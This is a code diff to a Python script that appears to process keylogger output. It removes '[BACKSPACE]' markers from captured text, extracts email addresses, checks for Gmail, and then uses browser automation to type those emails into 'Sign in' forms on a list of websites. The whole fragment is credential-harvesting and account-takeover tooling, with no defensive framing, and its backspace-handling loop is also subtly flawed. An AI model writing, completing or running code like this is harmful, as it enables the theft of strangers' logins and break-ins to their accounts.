@@ -13,7 +13,14 @@ def Words(filename):
         
     with open(filename) as f:
         contents = "".join(f.read().splitlines())
+        i = 0
+        while i < len(contents):
+            if contents[i : i+11] == "[BACKSPACE]":
+                contents = contents[0: i-1] + contents[i+ 11: len(contents)]
+                #print(contents)
+            i+=1
         contents = re.sub("[\(\[].*?[\)\]]", "", contents)
+        #print(contents)
         return contents
 def verifiyGmail(contents):
     match = re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', contents)
@@ -40,9 +47,6 @@ def tryEmailAndPass(email, passW):
     web = Browser()
     for i in webList:
         web.go_to(i)
-        #web.type('hello its me')  # or web.press(web.Key.SHIFT + 'hello its me')
-        #web.press(web.Key.ENTER)
-        #web.go_back()
         web.click('Sign in')
         web.type(email , into='Email')
         web.click('NEXT' , tag='span')
